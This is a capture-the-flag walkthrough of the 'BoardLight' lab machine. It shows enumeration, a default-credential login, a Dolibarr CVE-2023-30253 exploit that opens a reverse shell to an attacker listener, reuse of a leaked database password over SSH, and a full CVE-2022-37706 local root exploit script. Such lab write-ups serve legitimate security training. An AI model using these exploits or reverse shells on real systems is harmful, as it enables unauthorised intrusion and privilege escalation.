---

title: 'Board Light Machine'
cover: "./boardlight-machine-img/00-boardlight-banner.png"
date: 2024-08-04T11:27:00+03:00
draft: false

---

> Target machine IP:
>10,129,231.37

## Recognition scanning with Nmap

```sh
❯ sudo nmap -p- --min-rate 5000 --open -n -Pn 10.129.231.37 -oN open_port-scan
[sudo] password for donatello: 
Starting Nmap 7.94SVN (https://nmap.org) at 2024-08-03 15:18-03
Nmap scan report for 10.129.231.37
Host is up (0.19s latency).
Not shown: 65333 closed tcp ports (reset), 200 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 16.07 seconds

```

From what we see, the result was very short and many ports were closed and many others were filtered. For the moment we are going to perform a version scan of the services that are currently running and then we will see that it is hosted on port 80

### Nmap version and script scanning

```sh
❯ sudo nmap -p22,80 -sV -sC -Pn 10.129.231.37 -oN version-scan-ports
Starting Nmap 7.94SVN (https://nmap.org) at 2024-08-03 15:25-03
Nmap scan report for 10.129.231.37
Host is up (0.19s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_ 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds

```

We see that we have OpenSSH 8.2p1 with protocol 2.0 on port 22
and on port 80 the version of Apache Apache httpd 2.4.41 is running

(if we get some credentials we can establish a secure connection to the machine with the SSH service)

---

### Port 80 website

After adding the IP address to the /etc/host file, we are going to investigate a little about what board light is about.

```sh
sudo echo '10.129.231.37 board.htb' | sudo tee -a /etc/hosts
```

{{< image src="../../../boardlight-machine-img/01-homepage-board.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

Reviewing the site you can see that most of the pages end in .php so we could have an attack vector here.

#### Website Technologies

{{< image src="../../../boardlight-machine-img/02-wappalyzer.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

Wappalyser confirms that PHP is running behind the scenes on the site.

### Enumeration of subdomains with FFUF

```sh
./ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://board.htb" -H "host: FUZZ.board.htb" -fc 302 -fs 15949

        /'___\ /'___\ /'___\       
       /\ \__/ /\ \__/ __ __ /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\ \ \_\ \ \____/ \ \_\       
          \/_/ \/_/ \/___/ \/_/       

       v2.1.0-dev
________________________________________________

 :: Method : GET
 ::URL: http://board.htb
 :: Wordlist : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header : Host: FUZZ.board.htb
 ::Follow redirects : false
 ::Calibration:false
 ::Timeout: 10
 :: Threads : 40
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter : Response status: 302
 :: Filter : Response size: 15949
________________________________________________

crm [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 214ms]
:: Progress: [4989/4989] :: Job [1/1] :: 210 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

It looks like we have a subdomain ready to be added to /etc/hosts

### Enumerating crm.board.htb

The first thing we see on the page is a login panel and it also seems that something called dolibarr version 17.0.0 is running

{{< image src="../../../boardlight-machine-img/03-login-page-dolibarr.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

#### What is dolibar? Is there an Exploit?

>Dolibarr ERP CRM is an open source, free software package for companies of any size, foundations or freelancers. It includes different features for enterprise resource planning and customer relationship management but also other features for different activities. Wikipedia

#### Enumeration of crm.board.htb

```sh
dirsearch -u http://crm.board.htb

  _|. _ _ _ _ _ _|_ v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11723

Output: /home/donatello/Documents/HTB-Machines/BoardLight/reports/http_crm.board.htb/__24-08-03_16-42-16.txt

Target: http://crm.board.htb/

[16:42:16] Starting: 
[16:42:31] 403 - 278B - /.ht_wsr.txt
[16:42:32] 403 - 278B - /.htaccess.bak1
[16:42:32] 403 - 278B - /.htaccess.orig
[16:42:32] 403 - 278B - /.htaccess.sample
[16:42:32] 403 - 278B - /.htaccess.save
[16:42:32] 403 - 278B - /.htaccess_extra
[16:42:35] 403 - 278B - /.htaccessBAK
[16:42:35] 403 - 278B - /.htaccessOLD
[16:42:35] 403 - 278B - /.htaccess_sc
[16:42:35] 403 - 278B - /.htaccessOLD2
[16:42:35] 403 - 278B - /.htm
[16:42:35] 403 - 278B - /.htaccess_orig
[16:42:35] 403 - 278B - /.html
[16:42:35] 403 - 278B - /.htpasswds
[16:42:35] 403 - 278B - /.htpasswd_test
[16:42:35] 403 - 278B - /.httr-oauth
[16:42:46] 403 - 278B - /.php
[16:43:17] 301 - 314B - /admin -> http://crm.board.htb/admin/
[16:43:56] 301 - 312B - /api -> http://crm.board.htb/api/
[16:43:56] 200 - 103B - /api/
[16:44:00] 403 - 278B - /asterisk/
[16:44:11] 301 - 319B - /categories -> http://crm.board.htb/categories/
[16:44:25] 404 - 16B - /composer.phar
[16:44:25] 403 - 278B - /conf/
[16:44:25] 403 - 278B - /conf/catalina.policy
[16:44:25] 403 - 278B - /conf/catalina.properties
[16:44:25] 403 - 278B - /conf/Catalina
[16:44:25] 403 - 278B - /conf/logging.properties
[16:44:25] 403 - 278B - /conf/context.xml
[16:44:25] 403 - 278B - /conf/tomcat8.conf
[16:44:25] 403 - 278B - /conf/web.xml
[16:44:25] 403 - 278B - /conf/server.xml
[16:44:25] 403 - 278B - /conf/tomcat-users.xml
[16:44:26] 403 - 278B - /conf
[16:44:31] 301 - 316B - /contact -> http://crm.board.htb/contact/
[16:44:33] 301 - 313B - /core -> http://crm.board.htb/core/
[16:44:34] 403 - 278B - /cron/
[16:44:34] 301 - 313B - /cron -> http://crm.board.htb/cron/
[16:44:35] 403 - 278B - /custom/
[16:45:01] 200 - 2KB - /favicon.ico
[16:45:05] 301 - 312B - /ftp -> http://crm.board.htb/ftp/
[16:45:18] 301 - 317B - /includes -> http://crm.board.htb/includes/
[16:45:21] 403 - 278B - /includes/
[16:45:23] 301 - 316B - /install -> http://crm.board.htb/install/
[16:45:24] 200 - 501B - /install/
[16:45:24] 200 - 501B - /install/index.php?upgrade/
[16:46:02] 404 - 16B - /php-cs-fixer.phar
[16:46:03] 403 - 278B - /php5.fcgi
[16:46:12] 404 - 16B - /phpunit.phar
[16:46:16] 301 - 316B - /product -> http://crm.board.htb/product/
[16:46:18] 301 - 315B - /public -> http://crm.board.htb/public/
[16:46:18] 302 - 0B - /public/ -> /public/error-404.php
[16:46:23] 301 - 317B - /resource -> http://crm.board.htb/resource/
[16:46:24] 200 - 146B - /robots.txt
[16:46:31] 200 - 210B - /security.txt
[16:46:31] 403 - 278B - /server-status
[16:46:31] 403 - 278B - /server-status/
[16:46:56] 301 - 316B - /support -> http://crm.board.htb/support/
[16:46:56] 200 - 5KB - /support/
[16:47:06] 301 - 314B - /theme -> http://crm.board.htb/theme/
[16:47:16] 301 - 313B - /user -> http://crm.board.htb/user/
[16:47:16] 403 - 278B - /user/
[16:47:16] 301 - 319B - /user/admin -> http://crm.board.htb/user/admin/
[16:47:27] 301 - 316B - /website -> http://crm.board.htb/website/

Task Completed
```

#### Robots.txt

{{< image src="../../../boardlight-machine-img/04-robots-crm.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

After a long time reviewing every possible directory, I did not find any type of credential, so we are going to try the classic reliable, default credentials.

I tried using common credentials and it was successful user/password admin:admin

{{< image src="../../../boardlight-machine-img/05-login-crm.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

### Search for an exploit for Dolibarr v17.0.0

The first thing we do is search on Google or any search engine if there is any vulnerability for the version of dolibarr that we find.

{{< image src="../../../boardlight-machine-img/google-exploit-dolibarr.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

As seen in the image above we have a match!

### Using the CVE-2023-30253 exploit

In this repository is the exploit that will give us access to the machine, we simply have to clone it and using the credentials that we found for the admin we will obtain access to the machine.

[Exploit-Dolibarr](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

### Getting access

```sh
python3 exploit.py http://crm.board.htb admin admin 10.10.15.62 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```sh
nc-lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.62] from (UNKNOWN) [10.129.231.37] 38664
bash: cannot set terminal process group (880): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

Once inside the server, we will now be able to see all the configuration files that we listed with dirsearch that were previously prohibited (code 401)

The one that had caught my attention the most was the conf that we found listing, and after wandering through all the directories of the machine in the conf.php within the /conf directory we found something interesting.

```sh title=conf.php
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/ crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';

$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
```

Then the first thing I did was run the cat command in the /etc/passwd file to locate possible users and the only one registered apart from root was a user named Larissa.

### Obtaining an SSH connection for user larissa

Now that we have a user we can try the password we found pass: serverfun2$2023!! user:larissa

```sh
❯ ssh larissa@board.htb
The authenticity of host 'board.htb (10.129.231.37)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? forks
Warning: Permanently added 'board.htb' (ED25519) to the list of known hosts.
larissa@board.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ 
```

If we execute the ls command we will see the user.txt file that contains the flag for the user.

{{< image src="../../../boardlight-machine-img/06-user-flag.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

### Escalating privileges to Root

To escalate privileges we use the linpeas.sh tool, which we can download from github and transfer it to the target machine through an http server with python, you can also choose the way to transfer the script in another way.

After running the program we see that we have several files with SUID privileges that we can exploit.

{{< image src="../../../boardlight-machine-img/07-linpeas-scan.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

Now if we go to the browser and search for enlightment_sys exploit we will find this repository the first time

{{< image src="../../../boardlight-machine-img/08-google-exploit.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

[CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)

The only thing we have to do is bring the exploit to the target machine.

If we try to make a git clone of the repository we will see that git is not installed, so we can do it through an http server from our machine with python or we create a .sh file with nano on the target machine and copy the code there, then we give it permissions execution and that's it.

```sh
larissa@boardlight:~$ nano suid.sh 
larissa@boardlight:~$ cat suid.sh
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take a few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/ tmp/exploit" /tmp///net
```

Now all that remains is to execute it and let the magic happen!

{{< image src="../../../boardlight-machine-img/09-root-pwnd.png" alt="greenhorn.htb website" position="center" style="border-radius: 8px;" >}}

Ready! The machine was hacked, I hope you liked this tour, the machine itself was not very difficult but it was super fun and very well done. Especially for us beginners.
